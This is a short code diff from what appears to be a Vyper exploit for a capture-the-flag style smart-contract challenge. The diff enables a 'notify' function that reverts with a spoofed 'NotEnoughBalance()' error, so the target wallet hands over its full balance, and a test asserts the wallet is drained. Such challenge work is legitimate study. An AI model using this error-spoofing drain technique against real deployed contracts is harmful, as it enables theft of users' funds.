@@ -31,7 +31,7 @@ def attack():
     self.instance.requestDonation()
     assert self.coin.balances(self.instance.wallet()) == 0, "wallet !drained"
 
-#@external
-#def notify(amount: uint256):
-    #if amount <= 10:
-        #raw_revert(method_id("NotEnoughBalance()"))
+@external
+def notify(amount: uint256):
+    if amount <= 10:
+        raw_revert(method_id("NotEnoughBalance()"))
